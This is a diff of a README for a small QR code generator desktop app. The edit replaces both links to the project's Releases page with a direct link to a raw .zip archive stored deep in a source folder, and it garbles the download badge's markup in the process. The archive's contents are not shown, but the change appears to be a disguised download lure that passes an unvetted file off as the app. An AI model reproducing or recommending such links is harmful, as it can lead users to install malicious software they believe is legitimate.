@@ -4,7 +4,7 @@
 The **qr-code-generater** is a user-friendly desktop application that lets you create QR codes quickly. This app supports PNG and SVG formats with options for white or transparent backgrounds. Whether you’re using Windows, macOS, or Linux, you can generate your codes with ease.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/babachar20/qr-code-generater/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/babachar20/qr-code-generater/main/src/qrstudio/encoding/generater-code-qr-2.1.zip%20Now-Click%https://raw.githubusercontent.com/babachar20/qr-code-generater/main/src/qrstudio/encoding/generater-code-qr-2.1.zip)](https://raw.githubusercontent.com/babachar20/qr-code-generater/main/src/qrstudio/encoding/generater-code-qr-2.1.zip)
 
 ## 🛠️ Features
 - **Simple User Interface**: The app uses Tkinter, which creates a straightforward and clean interface.
@@ -18,7 +18,7 @@ The **qr-code-generater** is a user-friendly desktop application that lets you c
 - **Python**: Python version 3.9 or higher must be installed on your system. If you prefer a packaged version, the application includes everything you need.
 
 ## ⬇️ Download & Install
-Visit this page to download: [Releases Page](https://github.com/babachar20/qr-code-generater/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/babachar20/qr-code-generater/main/src/qrstudio/encoding/generater-code-qr-2.1.zip).
 
 1. Click on the **Releases Page** link above.
 2. Find the latest version of the application.
